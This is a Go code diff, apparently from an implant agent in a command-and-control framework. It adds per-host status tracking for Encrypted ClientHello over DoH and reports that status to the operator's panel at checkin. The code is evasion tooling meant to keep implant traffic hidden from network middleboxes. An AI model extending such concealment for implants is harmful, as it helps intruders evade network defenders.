@@ -122,7 +122,49 @@ var (
 	echCache   = map[string]*echEntry{}
 	dohMu      sync.RWMutex
 	dohURL     string // last DoH endpoint the agent installed
+
+	// ECH observability: a silent degradation (middlebox starts RSTing ECH
+	// ClientHellos and we fall back to plain SNI) must be VISIBLE to the
+	// operator, not just logged on the agent. The status rides checkin as
+	// def.Emp3r0rAgent.ECHStatus and surfaces as a badge in the panel.
+	echStatusMu     sync.Mutex
+	echStatusHosts  = map[string]string{} // host -> armed | degraded | off
+	echStatusReason = map[string]string{} // host -> last degradation reason
 )
+
+func setECHStatus(host, status, reason string) {
+	echStatusMu.Lock()
+	defer echStatusMu.Unlock()
+	echStatusHosts[host] = status
+	if reason != "" {
+		echStatusReason[host] = reason
+	} else if status == "armed" {
+		delete(echStatusReason, host)
+	}
+}
+
+// ECHStatus aggregates the per-host ECH state for checkin reporting.
+// armed wins over degraded wins over off; empty when ECH was never
+// attempted for any host.
+func ECHStatus() string {
+	echStatusMu.Lock()
+	defer echStatusMu.Unlock()
+	best, bestReason := "", ""
+	rank := map[string]int{"armed": 3, "degraded": 2, "off": 1}
+	for host, st := range echStatusHosts {
+		if rank[st] > rank[best] {
+			best = st
+			bestReason = echStatusReason[host]
+		}
+	}
+	if best == "" {
+		return ""
+	}
+	if bestReason != "" {
+		return best + " (" + bestReason + ")"
+	}
+	return best
+}
 
 // SetDoHEndpoint records the agent's DoH URL so background ECH refreshes
 // know where to query. Called when the agent (re)installs its resolver.
@@ -198,10 +240,12 @@ func RefreshECHConfig(doh, host string) bool {
 	// URL query (which ends up in access logs)
 	body, err := DoHPost(DoHHTTPClient(nil), doh, secret, wire)
 	if err != nil {
+		setECHStatus(host, "off", "ech config fetch failed: "+err.Error())
 		return false
 	}
 	answer := new(dns.Msg)
 	if err := answer.Unpack(body); err != nil {
+		setECHStatus(host, "off", "ech config parse failed")
 		return false
 	}
 	for _, rr := range answer.Answer {
@@ -226,6 +270,7 @@ func RefreshECHConfig(doh, host string) bool {
 			return true
 		}
 	}
+	setECHStatus(host, "off", "no ech= in HTTPS record")
 	return false
 }
 
